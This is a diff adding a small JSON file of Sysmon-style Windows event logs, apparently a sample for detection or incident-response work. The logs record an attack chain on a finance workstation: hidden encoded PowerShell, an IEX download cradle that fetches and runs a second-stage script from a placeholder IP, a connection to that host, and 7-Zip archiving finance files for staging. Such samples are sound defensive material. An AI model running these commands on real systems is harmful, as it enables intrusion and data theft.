@@ -1,0 +1,6 @@
+[
+  {"UtcTime": "2026-10-20 09:15:20.311", "EventID": 1, "Computer": "WS-FIN-01.corp.local", "User": "CORP\\jdoe", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe -NoP -W Hidden -enc JABjAGwAaQBlAG4AdAAgAD0A", "ParentImage": "C:\\Windows\\System32\\cmd.exe"},
+  {"UtcTime": "2026-10-20 09:16:05.742", "EventID": 1, "Computer": "WS-FIN-01.corp.local", "User": "CORP\\jdoe", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe -NoP IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.45/stage2.ps1')", "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"},
+  {"UtcTime": "2026-10-20 09:17:30.120", "EventID": 3, "Computer": "WS-FIN-01.corp.local", "User": "CORP\\jdoe", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "DestinationIp": "203.0.113.45", "DestinationPort": 443},
+  {"UtcTime": "2026-10-20 09:38:10.504", "EventID": 1, "Computer": "WS-FIN-01.corp.local", "User": "CORP\\jdoe", "Image": "C:\\Program Files\\7-Zip\\7z.exe", "CommandLine": "7z.exe a C:\\Users\\Public\\finance_q3.7z C:\\Finance\\Q3\\*", "ParentImage": "C:\\Windows\\System32\\cmd.exe"}
+]
